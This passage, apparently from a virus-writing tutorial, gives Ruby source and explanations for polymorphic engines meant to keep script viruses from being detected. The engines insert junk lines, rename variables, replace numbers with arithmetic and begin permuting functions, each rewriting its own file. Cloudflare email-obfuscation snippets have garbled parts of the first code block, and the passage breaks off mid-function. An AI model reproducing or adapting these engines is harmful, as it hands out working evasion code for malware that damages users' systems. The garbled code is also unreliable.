&nbsp;<span style="color:#0066ff; font-weight:bold;">@cc</span><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="7f423f121951">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script><span style="color:#9900CC;">read</span><span style="color: black;">&#40;</span><span style="color:#006666;">1</span><span style="color: black;">&#41;</span><br/>
<span style="color:#9966CC; font-weight:bold;">while</span> <span style="color:#0066ff; font-weight:bold;">@cc</span>!=<span style="color:#0000FF; font-weight:bold;">nil</span><br/>
&nbsp; <span style="color:#0066ff; font-weight:bold;">@code</span><span style="color:#006600; font-weight:bold;">+</span><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="566b163535">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script><br/>
&nbsp; <span style="color:#0066ff; font-weight:bold;">@cc</span><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a994e9c4cf87">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script><span style="color:#9900CC;">read</span><span style="color: black;">&#40;</span><span style="color:#006666;">1</span><span style="color: black;">&#41;</span><br/>
<span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp;<span style="color:#0066ff; font-weight:bold;">@mf</span>.<span style="color:#9900CC;">close</span><br/>
&nbsp;<span style="color:#0066ff; font-weight:bold;">@newcode</span>=<span style="color:#996600;">&quot;&quot;</span><br/>
&nbsp;<span style="color:#0066ff; font-weight:bold;">@i</span>=<span style="color:#006666;">0</span><br/>
<span style="color:#9966CC; font-weight:bold;">while</span> <span style="color:#0066ff; font-weight:bold;">@i</span><span style="color:#006600; font-weight:bold;">&lt;</span>@code.<span style="color:#9900CC;">length</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> <span style="color:#0066ff; font-weight:bold;">@code</span><span style="color: black;">&#91;</span>@i,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span>==<span style="color:#006666;">10</span>.<span style="color:#9900CC;">chr</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; <span style="color:#0066ff; font-weight:bold;">@newcode</span><span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">10</span>.<span style="color:#9900CC;">chr</span><br/>
&nbsp; &nbsp; <span style="color:#0066ff; font-weight:bold;">@i</span><span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">1</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> <span style="color:#0066ff; font-weight:bold;">@code</span><span style="color: black;">&#91;</span>@i,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span>==<span style="color:#996600;">'#'</span> <span style="color:#9966CC; font-weight:bold;">or</span> <span style="color:#0066ff; font-weight:bold;">@code</span><span style="color: black;">&#91;</span>@i,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span>==<span style="color:#996600;">'@'</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">while</span> <span style="color:#0066ff; font-weight:bold;">@code</span><span style="color: black;">&#91;</span>@i,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span>!=<span style="color:#006666;">10</span>.<span style="color:#9900CC;">chr</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#0066ff; font-weight:bold;">@i</span><span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">1</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">else</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> <span style="color:#CC0066; font-weight:bold;">rand</span><span style="color: black;">&#40;</span><span style="color:#006666;">10</span><span style="color: black;">&#41;</span>==<span style="color:#006666;">1</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#0066ff; font-weight:bold;">@newcode</span><span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#996600;">'# '</span><span style="color:#006600; font-weight:bold;">+</span>rn<span style="color: black;">&#40;</span><span style="color:#CC0066; font-weight:bold;">rand</span><span style="color: black;">&#40;</span><span style="color:#006666;">50</span><span style="color: black;">&#41;</span>,<span style="color:#006666;">1</span><span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">10</span>.<span style="color:#9900CC;">chr</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">elsif</span> <span style="color:#CC0066; font-weight:bold;">rand</span><span style="color: black;">&#40;</span><span style="color:#006666;">10</span><span style="color: black;">&#41;</span>==<span style="color:#006666;">2</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#0066ff; font-weight:bold;">@newcode</span><span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#996600;">'@'</span><span style="color:#006600; font-weight:bold;">+</span>rn<span style="color: black;">&#40;</span><span style="color:#CC0066; font-weight:bold;">rand</span><span style="color: black;">&#40;</span><span style="color:#006666;">10</span><span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">2</span>,<span style="color:#006666;">1</span><span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;=&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">34</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span>rn<span style="color: black;">&#40;</span><span style="color:#CC0066; font-weight:bold;">rand</span><span style="color: black;">&#40;</span><span style="color:#006666;">23</span><span style="color: black;">&#41;</span>,<span style="color:#006666;">1</span><span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">34</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">10</span>.<span style="color:#9900CC;">chr</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">elsif</span> <span style="color:#CC0066; font-weight:bold;">rand</span><span style="color: black;">&#40;</span><span style="color:#006666;">10</span><span style="color: black;">&#41;</span>==<span style="color:#006666;">3</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#0066ff; font-weight:bold;">@newcode</span><span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#996600;">'@'</span><span style="color:#006600; font-weight:bold;">+</span>rn<span style="color: black;">&#40;</span><span style="color:#CC0066; font-weight:bold;">rand</span><span style="color: black;">&#40;</span><span style="color:#006666;">10</span><span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">2</span>,<span style="color:#006666;">1</span><span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;=&quot;</span><span style="color:#006600; font-weight:bold;">+</span>rn<span style="color: black;">&#40;</span><span style="color:#CC0066; font-weight:bold;">rand</span><span style="color: black;">&#40;</span><span style="color:#006666;">23</span><span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">1</span>,<span style="color:#006666;">2</span><span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">10</span>.<span style="color:#9900CC;">chr</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">else</span><br/>
&nbsp; &nbsp; <span style="color:#0066ff; font-weight:bold;">@newcode</span><span style="color:#006600; font-weight:bold;">+</span><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b38ef3d0dcd7d6">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script><span style="color: black;">&#91;</span>@i,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; <span style="color:#0066ff; font-weight:bold;">@i</span><span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">1</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
<span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp;<span style="color:#0066ff; font-weight:bold;">@mf</span>=<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span><span style="color:#0000FF; font-weight:bold;">__FILE__</span>,<span style="color:#996600;">&quot;w&quot;</span><span style="color: black;">&#41;</span><br/>
&nbsp;<span style="color:#0066ff; font-weight:bold;">@mf</span>.<span style="color:#9900CC;">write</span><span style="color: black;">&#40;</span>@newcode<span style="color: black;">&#41;</span><br/>
&nbsp;<span style="color:#0066ff; font-weight:bold;">@mf</span>.<span style="color:#9900CC;">close</span><br/>
&nbsp;</div>
<p>The code you can see above works really good. I'm going to explain now how exactly it works:</p>
<ul>
<li>First thing it does is to read its own code. The engine needs it, of course, later on when it tries to remove old trash and add new one.</li>
<li>Then the engine gets every single letter of the code with a 'while'</li>
<li>The next step is the checking, if the current letter is a 10.chr (newline). If it's a 10.chr, the code checks if the line is trash (@ or # as first sign).</li>
<li>Then it includes 3/10 a new trashline, if the current line was no trash. There are three possibilities for a trash:
<ul>
<li>'# '+randomlenght (0-50 lowercase-letters)-string: # jksdfhjksdjkiebncy</li>
<li>'@'+random-string(2-12)+'="'+random-string(0-23)+'"': @wjkcma="kelcwmdsk"</li>
<li>'@'+random-string(2-12)+'="'+random-numbers(1-24) : @lkwnvmxkyz=1935761</li>
</ul></li>
<li>After that it adds the original line to the 'newcode'.</li>
<li>In the end it opens '__FILE__' and writes the 'newcode' to the file</li>
</ul>
<h3>d) Variable-Name Changing</h3>
<p>This is maybe the most well-known polymorphic technique for script viruses. It is already done in VBScript, JScript, PHP. That nearly forced me to write also a Ruby Variable-Name Changing engine. So I did. If anybody dont know the technique, i'll explain it: A virus code uses alot of variables, for doing different things. Normally variables have static names, but they would not need then. So we are going to change every variable in the code, and replace it with a new one. This sounds not difficult, and it is not difficult. Just look at the following code, which changes its variables on every execution. The explanation follows after the code.</p>
<p><strong>Polymorphism Example - Variable-Name changing</strong></p>
<div class="ruby" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color:#9966CC; font-weight:bold;">def</span> randnumf<span style="color: black;">&#40;</span>rnum<span style="color: black;">&#41;</span><br/>
&nbsp; rc=<span style="color:#996600;">&quot;&quot;</span><br/>
&nbsp; rnum<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">3</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">while</span> rnum<span style="color:#006600; font-weight:bold;">&gt;</span><span style="color:#006666;">0</span><br/>
&nbsp; &nbsp; rc<span style="color:#006600; font-weight:bold;">+</span>=<span style="color: black;">&#40;</span><span style="color:#CC0066; font-weight:bold;">rand</span><span style="color: black;">&#40;</span><span style="color:#006666;">26</span><span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">97</span><span style="color: black;">&#41;</span>.<span style="color:#9900CC;">chr</span><br/>
&nbsp; &nbsp; rnum<span style="color:#006600; font-weight:bold;">-</span>=<span style="color:#006666;">1</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; <span style="color:#0000FF; font-weight:bold;">return</span> rc<br/>
<span style="color:#9966CC; font-weight:bold;">end</span><br/>
<br/>
vlist=<span style="color: black;">&#91;</span><span style="color:#996600;">&quot;myfile&quot;</span>,<span style="color:#996600;">&quot;vlist&quot;</span>,<span style="color:#996600;">&quot;randnumf&quot;</span>,<span style="color:#996600;">&quot;rnum&quot;</span>,<span style="color:#996600;">&quot;rc&quot;</span>,<span style="color:#996600;">&quot;nlist&quot;</span>,<span style="color:#996600;">&quot;counterl&quot;</span>,<span style="color:#996600;">&quot;myfile&quot;</span>,<span style="color:#996600;">&quot;counteri&quot;</span>,<span style="color:#996600;">&quot;mycode&quot;</span>,<span style="color:#996600;">&quot;mycone&quot;</span>,<span style="color:#996600;">&quot;counterj&quot;</span>,<span style="color:#996600;">&quot;counterk&quot;</span>,<span style="color:#996600;">&quot;mynextfile&quot;</span><span style="color: black;">&#93;</span><br/>
nlist=<span style="color: black;">&#91;</span><span style="color: black;">&#93;</span><br/>
counterl=<span style="color:#006666;">0</span><br/>
<span style="color:#9966CC; font-weight:bold;">while</span> counterl<span style="color:#006600; font-weight:bold;">&lt;</span>vlist.<span style="color:#9900CC;">length</span><br/>
&nbsp; nlist<span style="color: black;">&#91;</span>counterl<span style="color: black;">&#93;</span>=randnumf<span style="color: black;">&#40;</span><span style="color:#006666;">10</span><span style="color: black;">&#41;</span><br/>
&nbsp; counterl<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">1</span><br/>
<span style="color:#9966CC; font-weight:bold;">end</span><br/>
myfile=<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span><span style="color:#0000FF; font-weight:bold;">__FILE__</span><span style="color: black;">&#41;</span><br/>
counteri=<span style="color:#006666;">0</span><br/>
mycode=<span style="color:#996600;">&quot;&quot;</span><br/>
mycone=myfile.<span style="color:#9900CC;">read</span><span style="color: black;">&#40;</span><span style="color:#006666;">1</span><span style="color: black;">&#41;</span><br/>
<span style="color:#9966CC; font-weight:bold;">while</span> mycone!=<span style="color:#0000FF; font-weight:bold;">nil</span><br/>
&nbsp; mycode<span style="color:#006600; font-weight:bold;">+</span>=mycone<br/>
&nbsp; mycone=myfile.<span style="color:#9900CC;">read</span><span style="color: black;">&#40;</span><span style="color:#006666;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; counteri<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">1</span><br/>
<span style="color:#9966CC; font-weight:bold;">end</span><br/>
counterk=<span style="color:#006666;">0</span><br/>
<br/>
<span style="color:#9966CC; font-weight:bold;">while</span> counterk<span style="color:#006600; font-weight:bold;">&lt;</span>vlist.<span style="color:#9900CC;">length</span><br/>
&nbsp; counterj=<span style="color:#006666;">0</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">while</span> counterj<span style="color:#006600; font-weight:bold;">&lt;</span>mycode.<span style="color:#9900CC;">length</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> mycode<span style="color: black;">&#91;</span>counterj,vlist<span style="color: black;">&#91;</span>counterk<span style="color: black;">&#93;</span>.<span style="color:#9900CC;">length</span><span style="color: black;">&#93;</span>==vlist<span style="color: black;">&#91;</span>counterk<span style="color: black;">&#93;</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; mycode<span style="color: black;">&#91;</span>counterj,vlist<span style="color: black;">&#91;</span>counterk<span style="color: black;">&#93;</span>.<span style="color:#9900CC;">length</span><span style="color: black;">&#93;</span>=nlist<span style="color: black;">&#91;</span>counterk<span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; counterj<span style="color:#006600; font-weight:bold;">+</span>=vlist<span style="color: black;">&#91;</span>counterk<span style="color: black;">&#93;</span>.<span style="color:#9900CC;">length</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">else</span><br/>
&nbsp; &nbsp; &nbsp; counterj<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">1</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; counterk<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">1</span><br/>
<span style="color:#9966CC; font-weight:bold;">end</span><br/>
<br/>
mynextfile=<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span><span style="color:#0000FF; font-weight:bold;">__FILE__</span>,<span style="color:#996600;">&quot;w&quot;</span><span style="color: black;">&#41;</span><br/>
mynextfile.<span style="color:#9900CC;">write</span><span style="color: black;">&#40;</span>mycode<span style="color: black;">&#41;</span><br/>
mynextfile.<span style="color:#9900CC;">close</span><br/>
&nbsp;</div>
<p>The idea of that technique isn't new, but its code is. Read the explanation to get the idea how this engine works:</p>
<ul>
<li>First the code defines an array called "vlist", which contains all variable names of the whole code.</li>
<li>Then the empty array 'nlist' is defined. In the next lines this array will be filed with random characters returned by the 'randnumf'-function. Now 'nlist' has as much elements as 'vlist', but the 'nlist' elements are new and random.</li>
<li>Then the code opens itself and reads the whole code.</li>
<li>Then the most important part of the code: The first 'while' gets every element of the 'vlist' (which contains the current used variable-names). The second 'while' gets every single letter of the code.</li>
<li>Then the 'if' checks if the current letter is the start of the current replaceable variable (well, not exactly, but it's easier to explain). If it is equal, the founden variable will be replaced with the variable of 'nlist'. And this goes on for every letter and every variable.</li>
<li>In the end, the code will be written back to the file.</li>
</ul>
<h3>e) Number Changing</h3>
<p>As you should already know it from it's name, this technique changes every number in the code. The main thing of this technique is, that a calculation could also return the real number of a code. This technique has also be used in JavaScript or PHP. If you don't understand my explanation just look at the example:</p>
<p>1 = (((156+224)/(150/30))-((13695+69)/(49+137))) = (-((17875/65)-(275-66))+((1012/46)+(9495/211)))</p>
<p>This should explain the idea. Now let's move to the code:</p>
<p><strong>Polymorphism Example - Number changing</strong></p>
<div class="ruby" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color:#9966CC; font-weight:bold;">def</span> rc<span style="color: black;">&#40;</span>number,rn,rre<span style="color: black;">&#41;</span><br/>
&nbsp; number=<span style="color:#CC0066; font-weight:bold;">Integer</span><span style="color: black;">&#40;</span>number<span style="color: black;">&#41;</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> rn==<span style="color:#006666;">0</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; <span style="color:#0000FF; font-weight:bold;">return</span> <span style="color:#996600;">&quot;(&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#CC0066; font-weight:bold;">String</span><span style="color: black;">&#40;</span>number<span style="color:#006600; font-weight:bold;">-</span>rre<span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;+&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#CC0066; font-weight:bold;">String</span><span style="color: black;">&#40;</span>rre<span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;)&quot;</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">elsif</span> rn==<span style="color:#006666;">2</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; <span style="color:#0000FF; font-weight:bold;">return</span> <span style="color:#996600;">&quot;(&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#CC0066; font-weight:bold;">String</span><span style="color: black;">&#40;</span>number<span style="color:#006600; font-weight:bold;">+</span>rre<span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;-&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#CC0066; font-weight:bold;">String</span><span style="color: black;">&#40;</span>rre<span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;)&quot;</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">else</span><br/>
&nbsp; &nbsp; <span style="color:#0000FF; font-weight:bold;">return</span> <span style="color:#996600;">&quot;(&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#CC0066; font-weight:bold;">String</span><span style="color: black;">&#40;</span>number<span style="color:#006600; font-weight:bold;">*</span>rre<span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;/&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#CC0066; font-weight:bold;">String</span><span style="color: black;">&#40;</span>rre<span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;)&quot;</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
<span style="color:#9966CC; font-weight:bold;">end</span><br/>
<br/>
mf=<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span><span style="color:#0000FF; font-weight:bold;">__FILE__</span><span style="color: black;">&#41;</span><br/>
code=<span style="color:#996600;">&quot;&quot;</span><br/>
c=mf.<span style="color:#9900CC;">read</span><span style="color: black;">&#40;</span><span style="color:#006666;">1</span><span style="color: black;">&#41;</span><br/>
<span style="color:#9966CC; font-weight:bold;">while</span> c!=<span style="color:#0000FF; font-weight:bold;">nil</span><br/>
&nbsp;code<span style="color:#006600; font-weight:bold;">+</span>=c<br/>
&nbsp;c=mf.<span style="color:#9900CC;">read</span><span style="color: black;">&#40;</span><span style="color:#006666;">1</span><span style="color: black;">&#41;</span><br/>
<span style="color:#9966CC; font-weight:bold;">end</span><br/>
<br/>
i=<span style="color:#006666;">0</span><br/>
<span style="color:#9966CC; font-weight:bold;">while</span> i<span style="color:#006600; font-weight:bold;">&lt;</span>code.<span style="color:#9900CC;">length</span><br/>
&nbsp; n=<span style="color:#996600;">&quot;&quot;</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">while</span> code<span style="color: black;">&#91;</span>i,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span>!=<span style="color:#006666;">10</span>.<span style="color:#9900CC;">chr</span> <span style="color:#9966CC; font-weight:bold;">and</span> code<span style="color: black;">&#91;</span>i,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span>!=<span style="color:#006666;">32</span>.<span style="color:#9900CC;">chr</span> <span style="color:#9966CC; font-weight:bold;">and</span> <span style="color:#CC0066; font-weight:bold;">eval</span><span style="color: black;">&#40;</span><span style="color:#996600;">&quot;?&quot;</span><span style="color:#006600; font-weight:bold;">+</span>code<span style="color: black;">&#91;</span>i,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">&lt;</span>=<span style="color:#006666;">57</span> <span style="color:#9966CC; font-weight:bold;">and</span> <span style="color:#CC0066; font-weight:bold;">eval</span><span style="color: black;">&#40;</span><span style="color:#996600;">&quot;?&quot;</span><span style="color:#006600; font-weight:bold;">+</span>code<span style="color: black;">&#91;</span>i,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">&gt;</span>=<span style="color:#006666;">48</span><br/>
&nbsp; &nbsp; n<span style="color:#006600; font-weight:bold;">+</span>=code<span style="color: black;">&#91;</span>i,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; i<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">1</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> n!=<span style="color:#996600;">&quot;&quot;</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; rndc=rc<span style="color: black;">&#40;</span>n,<span style="color:#CC0066; font-weight:bold;">rand</span><span style="color: black;">&#40;</span><span style="color:#006666;">3</span><span style="color: black;">&#41;</span>,<span style="color: black;">&#40;</span><span style="color:#CC0066; font-weight:bold;">rand</span><span style="color: black;">&#40;</span><span style="color:#006666;">250</span><span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; code<span style="color: black;">&#91;</span>i<span style="color:#006600; font-weight:bold;">-</span>n.<span style="color:#9900CC;">length</span>,n.<span style="color:#9900CC;">length</span><span style="color: black;">&#93;</span>=rndc<br/>
&nbsp; &nbsp; i<span style="color:#006600; font-weight:bold;">+</span>=<span style="color: black;">&#40;</span>rndc.<span style="color:#9900CC;">length</span><span style="color:#006600; font-weight:bold;">-</span>n.<span style="color:#9900CC;">length</span><span style="color: black;">&#41;</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; i<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">1</span><br/>
<span style="color:#9966CC; font-weight:bold;">end</span><br/>
<br/>
mf=<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span><span style="color:#0000FF; font-weight:bold;">__FILE__</span>,<span style="color:#996600;">&quot;w&quot;</span><span style="color: black;">&#41;</span><br/>
mf.<span style="color:#9900CC;">write</span><span style="color: black;">&#40;</span>code<span style="color: black;">&#41;</span><br/>
mf.<span style="color:#9900CC;">close</span><br/>
&nbsp;</div>
<p>Explanation of the code follows now, as at every example:</p>
<ul>
<li>First the code reads it's own code</li>
<li>Then the first 'while' gets every single letter of the code.</li>
<li>The second 'while' gets every number of the code. A number is a letter with the character 48&lt;= x &lt;= 58 AND x!=(32||10).chr. I had to use the 10|32.chr because it could be that the x is the last letter of a line.</li>
<li>It gives the number, a rnd(3), and a rnd(250)+1 to the 'rc'-function. This function then makes the new calculation. For instance: 250=(350-100) | 250=(149+101) | 250=(2500/10)</li>
<li>In the end the code writes the new code with the calculations to __FILE__.</li>
</ul>
<h3>f) Permutation</h3>
<p>This is a very well known technique for morphing viruses, and not only for scripts. A permutation code will be splitted in several parts, and then mixed together in a random order. How could we do it in Ruby? We use functions, and split the code into funtions, which are put together. Look at the code to understand the technique:</p>
<p><strong>Polymorphism Example - Permutation</strong></p>
<div class="ruby" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color:#9966CC; font-weight:bold;">def</span> start<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp; vf=<span style="color: black;">&#91;</span><span style="color: black;">&#93;</span><br/>
&nbsp; code=<span style="color:#996600;">&quot;&quot;</span><br/>
&nbsp; mf=<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span><span style="color:#0000FF; font-weight:bold;">__FILE__</span><span style="color: black;">&#41;</span><br/>
&nbsp; c=mf.<span style="color:#9900CC;">read</span><span style="color: black;">&#40;</span><span style="color:#006666;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">while</span> c!=<span style="color:#0000FF; font-weight:bold;">nil</span><br/>
&nbsp; &nbsp; code<span style="color:#006600; font-weight:bold;">+</span>=c<br/>
&nbsp; &nbsp; c=mf.<span style="color:#9900CC;">read</span><span style="color: black;">&#40;</span><span style="color:#006666;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; mf.<span style="color:#9900CC;">close</span><br/>
&nbsp; st2<span style="color: black;">&#40;</span>code,<span style="color:#006666;">0</span>,vf<span style="color: black;">&#41;</span><br/>
<span style="color:#9966CC; font-weight:bold;">end</span><br/>
<br/>
<span style="color:#9966CC; font-weight:bold;">def</span> st2<span style="color: black;">&#40;</span>code,i,vf<span style="color: black;">&#41;</span><br/>
&nbsp; fc=<span style="color:#006666;">6</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">while</span> i<span style="color:#006600; font-weight:bold;">&lt;</span>code.<span style="color:#9900CC;">length</span><br/>
